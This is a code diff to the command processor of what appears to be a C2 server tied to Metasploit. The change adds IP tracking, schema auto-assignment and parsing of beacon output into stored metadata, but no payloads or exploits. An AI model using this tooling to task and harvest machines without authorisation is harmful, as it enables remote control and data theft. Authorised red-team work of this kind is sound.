@@ -8,6 +8,7 @@ import utils
 from config import ServerConfig
 from database import BeaconRepository
 from .metasploit_service import ListenerConfig, MetasploitService, PayloadConfig
+from .output_parsers import OutputParserRegistry
 from utils import strip_filename_quotes
 
 class CommandProcessor:
@@ -15,26 +16,45 @@ class CommandProcessor:
     def __init__(self, beacon_repository: BeaconRepository):
         self.beacon_repository = beacon_repository
         self._metasploit_service = None
+        self.output_parser_registry = OutputParserRegistry()
 
-    def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None) -> str:
-        self.beacon_repository.update_beacon_status(beacon_id, 'online', computer_name, receiver_id)
+    def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None, ip_address: str = None, schema_file: str = None) -> str:
+        self.beacon_repository.update_beacon_status(beacon_id, 'online', computer_name, receiver_id, ip_address)
+
+        # Handle optional schema auto-assignment
+        if schema_file:
+            schema_path = Path("schemas") / schema_file
+            if schema_path.exists():
+                self.beacon_repository.update_beacon_schema(beacon_id, schema_file)
+                if utils.logger:
+                    utils.logger.log_message(f"Schema Auto-Assignment: {beacon_id} -> {schema_file}")
+            else:
+                if utils.logger:
+                    utils.logger.log_message(f"Schema Auto-Assignment Failed: {beacon_id} -> {schema_file} (file not found)")
+
         if utils.logger:
             display_name = receiver_name or receiver_id or "Unknown"
-            utils.logger.log_message(f"Beacon Registration: {beacon_id} ({computer_name}) via receiver {display_name}")
+            ip_info = f" from {ip_address}" if ip_address else ""
+            schema_info = f" [schema: {schema_file}]" if schema_file else ""
+            utils.logger.log_message(f"Beacon Registration: {beacon_id} ({computer_name}) via receiver {display_name}{ip_info}{schema_info}")
         return "Registration successful"
 
-    def process_action_request(self, beacon_id: str, receiver_id: str = None, receiver_name: str = None) -> str:
+    def process_action_request(self, beacon_id: str, receiver_id: str = None, receiver_name: str = None, ip_address: str = None) -> str:
         beacon = self.beacon_repository.get_beacon(beacon_id)
-        self.beacon_repository.update_beacon_status(beacon_id, "online", receiver_id=receiver_id)
+        self.beacon_repository.update_beacon_status(beacon_id, "online", receiver_id=receiver_id, ip_address=ip_address)
         if not beacon.pending_command:
             if utils.logger:
                 utils.logger.log_message(f"Check In: {beacon_id} - No pending commands")
             return "no_pending_commands"
-        
+
         if not beacon:
             return ""
 
         command = beacon.pending_command
+
+        # Track this command as the last executed command for output parsing
+        self.beacon_repository.update_last_executed_command(beacon_id, command)
+
         self.beacon_repository.update_beacon_command(beacon_id, None)
 
         return self._format_command_response(command)
@@ -48,11 +68,35 @@ class CommandProcessor:
             output_file = Path(config.LOGS_FOLDER) / f"output_{beacon_id}.txt"
             with open(output_file, 'a', encoding='utf-8') as f:
                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                f.write(f"[{timestamp}] {output}")
-            
+                f.write(f"[{timestamp}] {output}\n")
+
+            # Get the last executed command for parsing
+            last_command = self.beacon_repository.get_last_executed_command(beacon_id)
+
+            # Parse output and extract metadata
+            if last_command and output:
+                try:
+                    metadata = self.output_parser_registry.parse_output(last_command, output)
+                    if metadata:
+                        self.beacon_repository.store_beacon_metadata(
+                            beacon_id,
+                            metadata,
+                            source_command=last_command
+                        )
+                        if utils.logger:
+                            metadata_summary = ', '.join([f"{k}={v}" for k, v in metadata[:3]])
+                            if len(metadata) > 3:
+                                metadata_summary += f" (+{len(metadata) - 3} more)"
+                            utils.logger.log_message(
+                                f"Metadata Extracted: {beacon_id} - {metadata_summary}"
+                            )
+                except Exception as parse_error:
+                    if utils.logger:
+                        utils.logger.log_message(f"Parser Error: {beacon_id} - {str(parse_error)}")
+
             # Clear the pending command since received output
             self.beacon_repository.update_beacon_command(beacon_id, None)
-            
+
             # Update the agent's output file path if needed
             beacon = self.beacon_repository.get_beacon(beacon_id)
             if beacon and not beacon.output_file:
@@ -60,7 +104,7 @@ class CommandProcessor:
                     beacon_id,
                     str(output_file)
                 )
-            
+
             return "Output received"
         except Exception as e:
             if utils.logger:
